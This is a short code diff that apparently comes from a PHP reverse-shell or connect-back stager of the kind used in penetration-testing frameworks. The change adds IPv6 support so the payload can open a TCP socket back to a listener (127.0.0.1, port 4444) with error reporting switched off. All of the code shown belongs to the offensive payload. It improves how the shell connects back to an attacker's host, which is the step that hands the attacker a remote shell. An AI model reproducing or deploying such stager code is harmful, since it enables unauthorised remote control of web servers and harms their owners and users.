@@ -5,9 +5,12 @@ error_reporting(0);
 # it to the victim.
 $ip = '127.0.0.1';
 $port = 4444;
+$ipf = AF_INET;
+
 if (FALSE !== strpos($ip, ":")) {
 	# ipv6 requires brackets around the address
 	$ip = "[". $ip ."]";
+	$ipf = AF_INET6;
 }
 
 if (($f = 'stream_socket_client') && is_callable($f)) {
@@ -17,7 +20,7 @@ if (($f = 'stream_socket_client') && is_callable($f)) {
 	$s = $f($ip, $port);
 	$s_type = 'stream';
 } elseif (($f = 'socket_create') && is_callable($f)) {
-	$s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
 	$res = @socket_connect($s, $ip, $port);
 	if (!$res) { die(); }
 	$s_type = 'socket';
